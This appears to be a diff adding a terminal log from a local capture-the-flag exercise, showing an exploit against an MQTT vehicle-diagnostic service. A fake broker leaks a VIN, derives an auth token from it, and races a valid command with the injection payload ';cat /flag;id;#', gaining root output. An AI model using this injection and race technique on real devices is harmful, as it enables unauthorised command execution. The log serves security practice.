@@ -1,0 +1,43 @@
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab/platform && sudo bash setup_env.sh 2>&1 | tail -8
+-rw-r--r-- 1 root root 17  9月 26 14:15 /flag
+-rw-r--r-- 1 root root  6  9月 26 14:15 /mnt/version
+-rw-r--r-- 1 root root 17  9月 26 14:15 /mnt/VIN
++ sudo cat /mnt/VIN
+LSVNV2182E2123456+ echo
+
++ sudo cat /flag
+flag{local_test}
+
+mzj@Ubuntu-24.04:~$ cd ~/pwn-lab/platform && (sudo bash run_victim.sh > /tmp/victim.log 2>&1 &) ; sleep 3 ; tail -4 /tmp/victim.log ; timeout 60 python3 solve_mqtt.py && echo LOCAL_REPRO_OK
++ sudo pkill -f -- '--library-path . ./pwn'
++ sleep 0.5
++ cd /home/mzj/pwn-lab/platform/mqtt
++ exec sudo timeout 180 ./ld-linux-x86-64.so.2 --library-path . ./pwn
+====================================================================
+ 注入载荷 payload = ';cat /flag;id;#'
+ 模式 mode = server   (server=本地假 broker, client=连远程 broker)
+====================================================================
+[*] 假 broker 监听 127.0.0.1:9999 , 等待目标客户端连入 ...
+[+] 目标已连入: 127.0.0.1:47324
+[+] 收到 CONNECT
+[+] 已回 CONNACK
+[+] 收到 SUBSCRIBE pid=1 body=b'\x00\x01\x00\x04diag\x01'
+[+] 已回 SUBACK
+[+] 泄漏 VIN   = b'LSVNV2182E2123456'
+[+] 推导 token = 470bc8e0  (hash: h=h*31+(signed char)c)
+[>] 步骤1 (合法 set_vin, 通过校验后 sleep 2s): {"auth": "470bc8e0", "cmd": "set_vin", "arg": "1234567890"}
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "470bc8e0", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag/resp : b'unknown_command'
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "470bc8e0", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag/resp : b'unknown_command'
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "470bc8e0", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag/resp : b'unknown_command'
+[>] 步骤2 (竞争覆写 arg 全局): {"auth": "470bc8e0", "cmd": "unknown_command", "arg": ";cat /flag;id;#"}
+[<] diag/resp : b'unknown_command'
+[<] diag/resp : b'ret: flag{local_test}\nuid=0(root) gid=0(root) \xe7\xbb\x84=0(root)\n'
+[!] 命中 flag: flag{local_test}
+====================================================================
+[+] EXPLOIT SUCCESS
+LOCAL_REPRO_OK
+
+mzj@Ubuntu-24.04:~$ sudo pkill -f -- '--library-path . ./pwn' ; echo victim stopped
